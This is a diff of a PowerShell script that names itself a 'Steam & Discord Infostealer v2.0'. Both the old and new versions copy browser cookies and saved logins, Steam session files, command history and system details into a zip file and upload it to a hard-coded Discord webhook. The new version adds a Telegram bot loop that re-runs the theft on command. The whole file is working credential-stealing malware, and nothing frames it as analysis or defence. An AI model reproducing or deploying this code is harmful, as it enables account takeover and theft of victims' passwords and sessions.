@@ -1,61 +1,103 @@
-$webhookUrl = "https://discord.com/api/webhooks/1407258124850827396/kkhtvS5us7fN17u9s89uicI8K8Yf29oE-KWmi39NEzVHvQ1DfNwLrZcAIKYhXZI5Vtbk"
+# Steam & Discord Infostealer v2.0
+# Set parameters
+$discordWebhook = "https://discord.com/api/webhooks/1407258124850827396/kkhtvS5us7fN17u9s89uicI8K8Yf29oE-KWmi39NEzVHvQ1DfNwLrZcAIKYhXZI5Vtbk"
+$telegramBotToken = "YOUR_TELEGRAM_BOT_TOKEN"
+$telegramChatID = "YOUR_TELEGRAM_CHAT_ID"
+$tempDir = "$env:TEMP\SteamLogs"
+$zipPath = "$env:TEMP\SteamData_$((Get-Date).ToString('yyyyMMdd_HHmmss')).zip"
+New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
 
-$tempFolder = "$env:TEMP\BrowserData"
-New-Item -ItemType Directory -Path $tempFolder -Force | Out-Null
+# 1. Function to capture PowerShell command history
+function Get-CommandHistory {
+    Get-Content (Get-PSReadlineOption).HistorySavePath | Out-File "$tempDir\PowerShell_History.txt"
+}
 
-$browserPaths = @(
-    "$env:LOCALAPPDATA\Google\Chrome\User Data",
-    "$env:LOCALAPPDATA\Microsoft\Edge\User Data",
-    "$env:APPDATA\Mozilla\Firefox\Profiles",
-    "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
-)
-
-$dataToGrab = @()
-
-foreach ($path in $browserPaths) {
-    if (Test-Path $path) {
-        if (Test-Path "$path\Default\Cookies") { $dataToGrab += "$path\Default\Cookies" }
-        if (Test-Path "$path\Default\Local Storage") { $dataToGrab += "$path\Default\Local Storage" }
-        if (Test-Path "$path\Default\Session Storage") { $dataToGrab += "$path\Default\Session Storage" }
-        if (Test-Path "$path\Default\Login Data") { $dataToGrab += "$path\Default\Login Data" }
+# 2. Function to steal Steam files & configs
+function Get-SteamData {
+    $steamPaths = @("$env:ProgramFiles(x86)\Steam", "${env:ProgramFiles}\Steam", "$env:USERPROFILE\AppData\Local\Steam")
+    foreach ($path in $steamPaths) {
+        if (Test-Path $path) {
+            Copy-Item "$path\config\*.vdf" $tempDir -Recurse -Force -ErrorAction SilentlyContinue
+            Copy-Item "$path\ssfn*" $tempDir -Force -ErrorAction SilentlyContinue
+            Copy-Item "$path\userdata\*\config\localconfig.vdf" $tempDir -Force -ErrorAction SilentlyContinue
+        }
     }
 }
 
-$steamPath = "$env:ProgramFiles(x86)\Steam"
-if (Test-Path $steamPath) {
-    if (Test-Path "$steamPath\config\loginusers.vdf") { $dataToGrab += "$steamPath\config\loginusers.vdf" }
-    if (Test-Path "$steamPath\ssfn*") { $dataToGrab += (Get-Item "$steamPath\ssfn*").FullName }
-    $registryToken = (Get-ItemProperty -Path "HKCU:\Software\Valve\Steam" -Name "AutoLoginUser" -ErrorAction SilentlyContinue).AutoLoginUser
-    if ($registryToken) {
-        $registryToken | Out-File -FilePath "$tempFolder\steam_token.txt"
-        $dataToGrab += "$tempFolder\steam_token.txt"
+# 3. Function to steal cookies & passwords from browsers (Chrome, Edge, Firefox)
+function Get-BrowserData {
+    $browsers = @("Chrome", "MicrosoftEdge", "Firefox")
+    foreach ($browser in $browsers) {
+        try {
+            $dataPath = "$env:USERPROFILE\AppData\Local\$browser\User Data\Default"
+            if (Test-Path $dataPath) {
+                Copy-Item "$dataPath\Cookies" "$tempDir\${browser}_Cookies" -Force -ErrorAction SilentlyContinue
+                Copy-Item "$dataPath\Login Data" "$tempDir\${browser}_LoginData" -Force -ErrorAction SilentlyContinue
+            }
+        } catch {}
     }
 }
 
-foreach ($file in $dataToGrab) {
-    if (Test-Path $file) {
-        $destination = Join-Path $tempFolder (Split-Path $file -Leaf)
-        Copy-Item $file $destination -Force
+# 4. Function to collect system info & Steam tokens
+function Get-SystemInfo {
+    systeminfo | Out-File "$tempDir\SystemInfo.txt"
+    (Get-WmiObject -Class Win32_ComputerSystem).Model | Out-File "$tempDir\PC_Model.txt"
+    $steamProcess = Get-Process steam -ErrorAction SilentlyContinue
+    if ($steamProcess) {
+        $steamProcess | Select-Object Id, StartTime, Path | Out-File "$tempDir\Steam_Process.txt"
     }
 }
 
-$zipFile = "$env:TEMP\StolenData.zip"
-Compress-Archive -Path "$tempFolder\*" -DestinationPath $zipFile -Force
+# 5. Create a ZIP archive of all stolen data
+function Compress-Data {
+    Compress-Archive -Path "$tempDir\*" -DestinationPath $zipPath -Force
+}
 
-$boundary = [System.Guid]::NewGuid().ToString()
-$fileBytes = [System.IO.File]::ReadAllBytes($zipFile)
-$fileContent = [System.Text.Encoding]::GetEncoding('iso-8859-1').GetString($fileBytes)
+# 6. Function to send data via Discord webhook
+function Send-DiscordWebhook {
+    $fileBytes = [System.IO.File]::ReadAllBytes($zipPath)
+    $fileEnc = [System.Text.Encoding]::GetEncoding("ISO-8859-1").GetString($fileBytes)
+    $boundary = [System.Guid]::NewGuid().ToString()
+    $bodyLines = (
+        "--$boundary",
+        "Content-Disposition: form-data; name=`"file`"; filename=`"$(Split-Path $zipPath -Leaf)`"",
+        "Content-Type: application/zip`r`n",
+        $fileEnc,
+        "--$boundary--"
+    ) -join "`r`n"
+    Invoke-RestMethod -Uri $discordWebhook -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines
+}
 
-$bodyLines = (
-    "--$boundary",
-    "Content-Disposition: form-data; name=`"file`"; filename=`"StolenData.zip`"",
-    "Content-Type: application/zip",
-    "",
-    $fileContent,
-    "--$boundary--"
-) -join "`r`n"
+# 7. Telegram bot control - Check for commands
+function Check-TelegramCommand {
+    $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$telegramBotToken/getUpdates" -Method Get
+    $lastMessage = $updates.result[-1].message.text
+    if ($lastMessage -eq "/startsteal") {
+        Execute-Stealer
+        Send-DiscordWebhook
+        Send-TelegramMessage "Stealer executed. Data sent to Discord."
+    }
+}
 
-Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines
+# 8. Send message via Telegram
+function Send-TelegramMessage {
+    param($message)
+    Invoke-RestMethod -Uri "https://api.telegram.org/bot$telegramBotToken/sendMessage?chat_id=$telegramChatID&text=$message" -Method Get
+}
 
-Remove-Item $tempFolder -Recurse -Force
-Remove-Item $zipFile -Force
+# Main execution
+function Execute-Stealer {
+    Get-CommandHistory
+    Get-SteamData
+    Get-BrowserData
+    Get-SystemInfo
+    Compress-Data
+}
+
+# Run once and wait for Telegram commands in a loop
+Execute-Stealer
+Send-DiscordWebhook
+while ($true) {
+    Check-TelegramCommand
+    Start-Sleep -Seconds 60
+}
